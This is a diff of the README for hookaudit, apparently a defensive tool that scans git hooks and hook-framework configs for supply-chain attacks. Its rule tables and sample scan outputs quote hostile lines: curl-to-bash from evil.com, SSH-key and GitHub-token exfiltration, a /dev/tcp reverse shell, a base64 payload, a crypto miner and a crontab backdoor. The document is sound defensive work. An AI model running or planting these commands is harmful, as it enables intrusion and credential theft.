@@ -1,180 +1,168 @@
 # hookaudit
 
-**Git Hook & Repository Config Security Auditor**
+**Git Hook Security Auditor** — Scan git hook configurations for supply chain attack patterns.
 
-Scan git hooks, `.gitattributes`, `.git/config`, Husky, pre-commit, and lefthook configs for malicious patterns. Detects reverse shells, credential theft, data exfiltration, obfuscated payloads, crypto miners, and more.
+Every existing tool *uses* hooks for scanning (secrets, linting). Nobody *scans the hooks themselves*. hookaudit fills this gap.
 
-Zero dependencies. Stdlib only. Python 3.8+.
+## The Problem
 
-## Why?
+Git hooks run arbitrary code on your machine. Pre-commit configs pull from third-party repos. Husky scripts execute on every commit. Yet nobody audits these for:
 
-Git hooks execute arbitrary code automatically on clone, checkout, commit, merge, and push. Tools exist that **use** hooks for security — but nothing audits the **hooks themselves**.
+- **Shell injection** — `curl | bash` in hook entries
+- **Credential theft** — hooks reading `~/.ssh/`, `~/.aws/`, keychains
+- **Data exfiltration** — piping secrets to remote servers
+- **Supply chain risks** — unpinned versions, untrusted repos
+- **Hidden payloads** — base64-encoded backdoors
+- **Reverse shells** — `/dev/tcp` connections, netcat listeners
 
-Attack vectors include:
-- **`.git/hooks/post-checkout`** — runs on every `git clone` and `git checkout`
-- **`.gitattributes` filter drivers** — execute code on `git checkout` and `git add`
-- **`.git/config` fsmonitor** — runs a command on every git operation
-- **Husky/pre-commit/lefthook** — hook frameworks that run arbitrary commands
-- **`core.hooksPath`** — redirects hooks to a malicious directory
+hookaudit scans all of these. Zero dependencies. Single file.
 
 ## Install
 
 ```bash
-# Just copy the script
-curl -o hookaudit.py https://raw.githubusercontent.com/kriskimmerle/hookaudit/main/hookaudit.py
+# Just download it
+curl -O https://raw.githubusercontent.com/kriskimmerle/hookaudit/main/hookaudit.py
 chmod +x hookaudit.py
 
 # Or clone
 git clone https://github.com/kriskimmerle/hookaudit.git
 ```
 
+Requires Python 3.9+. No pip install needed.
+
 ## Usage
 
 ```bash
-# Scan current repository
+# Scan current project
 python3 hookaudit.py
 
-# Scan a specific repository
-python3 hookaudit.py /path/to/repo
+# Scan specific project
+python3 hookaudit.py /path/to/project
 
-# Scan a single hook file
-python3 hookaudit.py -f .git/hooks/post-checkout
+# CI mode (exit 1 if below grade B)
+python3 hookaudit.py --check B
 
-# JSON output for CI
+# JSON output
 python3 hookaudit.py --json
 
-# CI mode (exit 1 for HIGH, exit 2 for CRITICAL)
-python3 hookaudit.py --ci
+# Show fix suggestions
+python3 hookaudit.py --verbose
 
-# Show all rules
-python3 hookaudit.py --rules
+# Only show critical/high findings
+python3 hookaudit.py --severity HIGH
 
-# Verbose (include INFO findings)
-python3 hookaudit.py -v
+# Skip specific rules
+python3 hookaudit.py --ignore HK005,HK006
+
+# List all rules
+python3 hookaudit.py --list-rules
 ```
 
 ## What It Scans
 
-| Source | What | Auto-triggered? |
-|--------|------|-----------------|
-| `.git/hooks/` | Native git hooks | Yes — on clone, commit, push, etc. |
-| `.githooks/` | Custom hooks directory | Yes — if `core.hooksPath` is set |
-| `.gitattributes` | Filter/diff/merge drivers | Yes — on checkout, add, diff, merge |
-| `.git/config` | fsmonitor, credential helper, etc. | Yes — on every git operation |
-| `.husky/` | Husky hook scripts | Yes — on commit, push, etc. |
-| `.pre-commit-config.yaml` | Pre-commit framework | Yes — on commit |
-| `lefthook.yml` | Lefthook framework | Yes — on commit, push, etc. |
+| Source | Files |
+|--------|-------|
+| **pre-commit** | `.pre-commit-config.yaml` |
+| **Git hooks** | `.git/hooks/*` (custom scripts) |
+| **Husky** | `.husky/*` (Node.js hook manager) |
+| **Lefthook** | `lefthook.yml`, `lefthook-local.yml` |
+| **lint-staged** | `package.json`, `.lintstagedrc*` |
+| **Overcommit** | `.overcommit.yml` |
+| **Custom paths** | `core.hooksPath` in git config |
 
-## Rules (18)
+## Rules (20)
 
-| Rule | Severity | Description |
-|------|----------|-------------|
-| HA001 | CRITICAL | Reverse shell patterns (bash, netcat, python, perl, ruby, socat) |
-| HA002 | CRITICAL | Credential theft (SSH keys, AWS/GCP creds, keychains, browser data) |
-| HA003 | HIGH | Data exfiltration (HTTP POST, DNS tunneling, netcat pipe, scp/rsync) |
-| HA004 | CRITICAL | Download and execute (curl\|sh, wget\|sh, download+chmod+x) |
-| HA005 | HIGH | Obfuscated code (base64 decode, hex, eval, IFS manipulation) |
-| HA006 | CRITICAL | Dangerous commands (rm -rf /, fork bomb, disk overwrite) |
-| HA007 | HIGH | Privilege escalation (sudo, su, setuid/setgid) |
-| HA008 | CRITICAL | Environment variable exfiltration (secrets piped to network) |
-| HA009 | MEDIUM | Background process spawning (nohup, crontab, at, screen/tmux) |
-| HA010 | HIGH | Filesystem modification outside repo (shell profiles, /etc, /usr) |
-| HA011 | CRITICAL | Crypto mining (miner binaries, stratum pools, mining algorithms) |
-| HA012 | HIGH | Gitattributes filter/diff/merge drivers (code execution on checkout) |
-| HA013 | HIGH | Dangerous git config (fsmonitor, hooksPath, credential helper) |
-| HA014 | — | Husky hook framework scanning |
-| HA015 | MEDIUM | Pre-commit config suspicious repos or entries |
-| HA016 | — | Lefthook config scanning |
-| HA017 | INFO | Hook metadata (auto-triggered hooks, permissions) |
-| HA018 | HIGH | Binary content in hook files |
+| ID | Severity | Name | Description |
+|----|----------|------|-------------|
+| HK001 | CRITICAL | shell-injection | `curl\|bash`, `eval`, `exec` in hooks |
+| HK002 | CRITICAL | reverse-shell | `/dev/tcp`, netcat, socat backdoors |
+| HK003 | CRITICAL | data-exfiltration | POST with sensitive data to remote servers |
+| HK004 | CRITICAL | credential-access | Reading `.ssh/`, `.aws/`, `.gnupg/`, keychain |
+| HK005 | HIGH | unpinned-rev | Tag/branch instead of pinned SHA commit |
+| HK006 | HIGH | untrusted-repo | Hook from unverified repository source |
+| HK007 | HIGH | local-hook-danger | Local hook with dangerous commands |
+| HK008 | HIGH | hidden-payload | Base64 decoding, obfuscated code |
+| HK009 | MEDIUM | missing-rev | No version pinned (uses latest) |
+| HK010 | MEDIUM | filesystem-escape | Accessing files outside repo boundary |
+| HK011 | MEDIUM | sudo-usage | `sudo`, `su`, `doas`, setuid |
+| HK012 | MEDIUM | network-access | `curl`, `wget`, `fetch`, socket connections |
+| HK013 | MEDIUM | file-modification | `rm -rf`, truncation, dangerous file ops |
+| HK014 | MEDIUM | env-manipulation | PATH, LD_PRELOAD, PYTHONPATH modification |
+| HK015 | LOW | hook-bypass | `--no-verify`, SKIP patterns |
+| HK016 | LOW | excessive-hooks | 20+ hooks increase attack surface |
+| HK017 | HIGH | embedded-secret | Hardcoded API keys, tokens, private keys |
+| HK018 | MEDIUM | dangerous-language | `system`/`script`/`docker` language hooks |
+| HK019 | INFO | git-hook-script | Custom hook script inventory |
+| HK020 | MEDIUM | writable-hooks-dir | World-writable hooks directory |
 
 ## Example Output
 
-### Clean repository
+**Malicious config:**
 ```
-hookaudit — Git Hook Security Audit
+hookaudit — Git Hook Security Auditor
 
-  Grade: A+  Risk: SAFE (0/100)
-  Files scanned: 1  Hooks found: 0
-  Findings: 0
+  Grade: F (0/100)
+  Findings: 11 critical, 13 high, 6 medium, 1 info
 
-  ✓ No security issues found
-```
+  .pre-commit-config.yaml
+    ✖ [HK001] Shell injection in local hook 'build-check': curl piped to shell:26
+      → curl https://evil.com/payload.sh | bash
+    ✖ [HK004] Hook 'setup-env' accesses credentials: reading credential directory:32
+      → bash -c "eval $(cat ~/.ssh/id_rsa | base64) && echo done"
+    ✖ [HK017] Embedded secret in config: GitHub personal access token:53
+      → --api-key=ghp_1234567890abcdefghijklmnopqrstuvwxyz
 
-### Malicious repository
-```
-hookaudit — Git Hook Security Audit
-
-  Grade: F  Risk: CRITICAL (100/100)
-  Files scanned: 1  Hooks found: 1
-  Findings: 7
-
-  CRITICAL (4)
-    [HA002] Credential theft: SSH key access
-      .git/hooks/post-checkout:3
-      → tar czf /tmp/keys.tar.gz ~/.ssh/
-
-    [HA011] Crypto mining: crypto miner binary
-      .git/hooks/post-checkout:8
-      → nohup xmrig --url stratum+tcp://pool.mining.com:3333 &
-
-    [HA008] Environment exfiltration: secret env var sent to network
-      .git/hooks/post-checkout:5
-      → curl http://evil.com/?token=$GITHUB_TOKEN
-
-    [HA001] Reverse shell pattern detected
-      .git/hooks/post-checkout:10
+  .husky/pre-commit
+    ✖ [HK002] Reverse shell: bash reverse shell via /dev/tcp:11
       → bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+    ✖ [HK008] Hidden payload: base64 decode execution:14
+      → echo "Y3VybCBod..." | base64 -d | sh
+```
 
-  HIGH (2)
-    [HA003] Data exfiltration: HTTP POST data exfiltration
-      .git/hooks/post-checkout:4
-      → curl -X POST -d @/tmp/keys.tar.gz http://evil.com/collect
+**Secure config:**
+```
+hookaudit — Git Hook Security Auditor
 
-    [HA010] Filesystem modification: shell profile append
-      .git/hooks/post-checkout:7
-      → echo 'export PATH=/tmp/evil:$PATH' >> ~/.bashrc
+  Grade: A+ (100/100)
+  Findings: none
 
-  MEDIUM (1)
-    [HA009] Background process: crontab modification
-      .git/hooks/post-checkout:6
-      → crontab -l | { cat; echo '* * * * * /tmp/backdoor'; } | crontab -
+  ✓ No security issues found in git hooks
 ```
 
 ## CI Integration
 
-### GitHub Actions
+```yaml
+# GitHub Actions
+- name: Audit git hooks
+  run: python3 hookaudit.py --check B --no-color
+```
 
 ```yaml
-- name: Audit git hooks
-  run: python3 hookaudit.py --ci
+# GitLab CI
+hook-audit:
+  script:
+    - python3 hookaudit.py --check B --no-color
 ```
 
-Exit codes:
-- `0` — No HIGH or CRITICAL findings
-- `1` — HIGH findings detected
-- `2` — CRITICAL findings detected
+Exit codes: `0` = pass, `1` = below grade threshold, `2` = error.
 
-### JSON output
+## Why This Matters
 
-```bash
-python3 hookaudit.py --json | jq '.findings[] | select(.severity == "CRITICAL")'
-```
+Git hooks are a supply chain attack vector that's been hiding in plain sight:
 
-## Use Cases
+- **pre-commit configs** pull code from arbitrary GitHub repos and execute it
+- **Husky** runs shell scripts on every commit — if compromised, every developer is affected
+- **Tags can be moved** — `rev: v4.5.0` can point to different code tomorrow; only SHA pins are immutable
+- **Local hooks** with `language: system` run arbitrary shell commands
+- **Nobody audits** what these hooks actually do
 
-- **Audit cloned repos** before running any git commands
-- **CI pipeline check** to catch malicious hooks in PRs
-- **Security review** of open-source projects before contribution
-- **Supply chain audit** of git hook frameworks (Husky, pre-commit, lefthook)
-- **Incident response** to check if hooks were tampered with
+hookaudit is the first tool that treats git hooks as an attack surface rather than a trusted utility.
 
-## Limitations
+## Trusted Sources
 
-- Pattern-based detection (no execution/sandboxing)
-- Cannot detect novel/zero-day obfuscation techniques
-- Does not fetch or analyze pre-commit hook repos (only checks config)
-- Local `.git/hooks/` are not synced via git (but `.githooks/`, `.husky/`, and configs are)
+hookaudit maintains a list of well-known pre-commit hook publishers (pre-commit, psf, PyCQA, astral-sh, Google, etc.). Hooks from trusted orgs get a pass on HK006; unknown repos are flagged for review.
+
+To suppress for your own org: `--ignore HK006` or pin repos to SHA hashes.
 
 ## License
 
